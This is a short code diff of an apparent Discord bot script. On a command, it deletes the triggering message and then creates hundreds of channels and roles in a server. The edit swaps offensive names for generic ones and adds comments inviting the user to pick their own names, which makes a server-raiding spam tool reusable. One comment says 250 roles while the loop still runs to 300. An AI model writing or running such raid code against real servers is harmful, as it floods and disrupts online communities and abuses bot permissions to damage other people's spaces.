@@ -11,9 +11,9 @@ client.on('message', async msg => {
   {
     msg.delete();
     var i;
-    for ( i=0  ; i <= 300; i++) // makes 300 channels  named Get Fucked
+    for ( i=0  ; i <= 250; i++) // makes 250 channels named ' channel '
     {
-    var channel = await msg.guild.createChannel('Get Fucked');
+    var channel = await msg.guild.createChannel('channel'); // change ('channel')  to what you want
 
     }
 
@@ -22,10 +22,10 @@ client.on('message', async msg => {
   {
     msg.delete();
 
-    for ( i=0  ; i <= 300; i++) // makes 300 roles named dumbass
+    for ( i=0  ; i <= 300; i++) // makes 250 roles named 'role'
     {
 
-    await msg.guild.createRole({name:'dumbass'}) //spam make roles
+    await msg.guild.createRole({name:'role'}) // Change ({name:'role'}) to what you want
 
   }
 }
